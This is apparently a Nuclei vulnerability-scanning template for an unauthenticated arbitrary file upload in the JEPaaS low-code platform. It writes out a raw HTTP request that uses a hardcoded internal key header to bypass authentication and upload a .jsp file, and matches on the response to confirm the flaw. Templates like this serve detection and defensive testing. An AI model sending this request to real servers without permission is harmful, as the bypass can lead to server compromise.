id: jepaas-document-upload

info:
  name: Jepaas document - File Upload
  author: qwtd
  severity: critical
  description: |
    JEPaaS低代码平台document/file存在文件上传漏洞，未经身份验证的远程攻击者可利用内部默认的key参数绕过权限认证上传任意文件，获取服务器权限。需要搭配sql注入跑出文件路径。
  reference:
    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/JEPaaS%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0/JEPaaS%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0document%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%87%B4RCE%E6%BC%8F%E6%B4%9E.md
  tags: JEPaaS低代码平台

http:
  - raw:
      - |
        POST /je/document/file?bucket=webroot HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
        internalRequestKey: schedule_898901212
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
        Connection: close
        
        ------21909179191068471382830692394
        Content-Disposition: form-data; name="files"; filename="{{randstr}}.jsp"
        Content-Type: image/jpeg
        
        123
        ------21909179191068471382830692394--
      
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'createTime'
          - '{{randstr}}.jsp'
          - 'fileKey'
        condition: and
      - type: status
        status:
          - 200
